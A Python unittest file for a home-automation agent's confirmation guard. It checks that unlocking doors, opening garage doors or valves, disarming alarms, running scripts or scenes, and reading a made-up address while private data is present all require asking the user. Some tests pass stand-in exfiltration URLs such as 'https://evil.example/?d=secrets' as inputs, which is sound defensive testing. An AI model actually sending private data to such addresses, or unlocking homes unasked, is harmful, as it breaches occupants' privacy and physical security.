"""What always asks, whatever tool an agent was given: actions that could unlock, open or disarm, and (for agents) things
that could do anything, or a made-up address next to private data."""
import unittest

import support  # noqa: F401
from second_thought.agent import AgentTools as Agent
from second_thought.core import ha_sensitive


class Sensitive(unittest.TestCase):
    def test_opening_and_unlocking_always_ask(self):
        for service, entity in [("lock.unlock", "lock.front_door"), ("lock.open", ""), ("cover.open_cover", "cover.garage_door"),
                                ("cover.toggle", "cover.garage_door"), ("cover.set_cover_position", "cover.gate"), ("valve.toggle", ""),
                                ("valve.open_valve", ""), ("alarm_control_panel.alarm_disarm", ""), ("homeassistant.toggle", "lock.front_door"),
                                ("homeassistant.turn_on", "light.hall, cover.garage_door")]:
            self.assertTrue(ha_sensitive(service, entity), f"{service} on {entity}")

    def test_closing_locking_and_everyday_actions_dont(self):
        for service, entity in [("lock.lock", "lock.front_door"), ("cover.close_cover", "cover.garage_door"), ("cover.stop_cover", ""),
                                ("valve.close_valve", ""), ("alarm_control_panel.alarm_arm_away", ""), ("light.turn_on", "light.kitchen"),
                                ("homeassistant.toggle", "light.kitchen"), ("switch.turn_off", "switch.oven")]:
            self.assertFalse(ha_sensitive(service, entity), f"{service} on {entity}")


class AgentMustAsk(unittest.TestCase):
    def ask(self, tool, inp, seen="", private=True):
        return Agent._agent_must_ask(Agent, tool, inp, seen, private)

    def test_things_that_could_do_anything(self):
        for service in ("script.turn_on", "script.unlock_front_door", "scene.turn_on", "automation.trigger", "button.press", "input_button.press"):
            self.assertTrue(self.ask("call_service", {"service": service}), service)
        self.assertFalse(self.ask("call_service", {"service": "light.turn_on"}))
        self.assertFalse(self.ask("call_service", {"service": "automation.turn_off"}))
        self.assertTrue(self.ask("run_homey_flow", {"flow": "Good night"}))

    def test_mqtt_unlock_messages(self):
        self.assertTrue(self.ask("publish_mqtt", {"topic": "zigbee2mqtt/front_door_lock/set", "message": '{"state": "UNLOCK"}'}))
        self.assertTrue(self.ask("publish_mqtt", {"topic": "home/garage/open", "message": "1"}))
        self.assertFalse(self.ask("publish_mqtt", {"topic": "zigbee2mqtt/kitchen_light/set", "message": "ON"}))

    def test_made_up_addresses_next_to_private_data(self):
        seen = "Goal\nRead https://example.com/news/1 and https://example.com/a/"
        self.assertTrue(self.ask("read_page", {"url": "https://evil.example/?d=secrets"}, seen))
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/news/1"}, seen), "an address it read doesn't ask")
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/a"}, seen), "nor the same address without its last slash")
        self.assertTrue(self.ask("read_feed", {"url": "https://evil.example/feed?d=x"}, seen))
        self.assertFalse(self.ask("read_feed", {"url": ""}, seen), "your own feeds don't ask")
        self.assertFalse(self.ask("read_page", {"url": "https://evil.example/?d=x"}, seen, private=False), "nothing private: no need to ask")


if __name__ == "__main__":
    unittest.main()
